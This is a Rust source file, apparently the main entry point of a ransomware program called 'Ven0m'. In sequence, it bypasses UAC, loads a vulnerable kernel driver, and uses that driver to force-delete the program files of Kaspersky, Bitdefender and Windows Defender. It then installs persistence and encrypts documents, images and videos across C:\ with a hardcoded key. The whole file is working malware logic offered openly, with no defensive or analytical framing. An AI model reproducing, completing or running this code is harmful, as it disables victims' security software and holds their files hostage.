//#![windows_subsystem = "windows"]
use anyhow::{Context, Result, bail};

mod uac;
mod service;
mod driver;
mod vnm;
mod core;
mod persist;
mod encrypt;
mod wallpaper;
mod task;

const DRIVER_BYTES: &[u8] = include_bytes!(r"../IMFForceDelete.sys");
// Encryption key!!
const KEY: &[u8; 32] = b"G7m9Xq2vR4pL8bF1sW0cZ6kD3jN5yH8u";
const XTENSIONS: &[&str] = &["pdf", "doc", "xlms", "png", "jpg", "jpeg", "txt", "mp4"];
const DRV: &[&str] = &["C:\\"];

// Target folders 
const TARGETS: &[&str] = &[
    r"C:\Program Files (x86)\Kaspersky Lab",
    r"C:\Program Files\Bitdefender",
    r"C:\Program Files\Bitdefender Agent",
    r"C:\Program Files\Windows Defender",
];


// Exclusions lit
const XClUSIONS: &[&str] = &[
        "Windows",
        "Program Files",
        "Program Files (x86)",
        "ProgramData",  
        "$Recycle.Bin",
        "All Users",

    ];


// Entry
fn main() -> Result<()> {

    let bypass = uac::bypass()?;

    let driver_path = driver::load(DRIVER_BYTES)?;
    let srv = service::register_kernel_service(driver_path)?;

    //// Initializing the vulnerable driver 
    let hDriver = driver::init()?;
    println!("[+] Driver initialized and ready for operation, Handle : {:p}", &hDriver);
    
    // ----- Shredding all AV/EDR files before encryption ---- //

    for target_folder in TARGETS {
        let files = core::gen_list(target_folder)?;
        for file in core::extention_filter(&files, &["dll", "exe", "sys"])? { 
            driver::ForceDelete(hDriver, &file.to_string_lossy())?;
        }
    } 
   

    // Persist!
    let pers = persist::persist()?;

    // Triggering encryption
    let rans = vnm::Ven0m(DRV, KEY, XClUSIONS, XTENSIONS)?;  

    // Closing the handle
    println!("[*] Cleaning up ...");
    driver::exit(hDriver)?;

    Ok(())
}



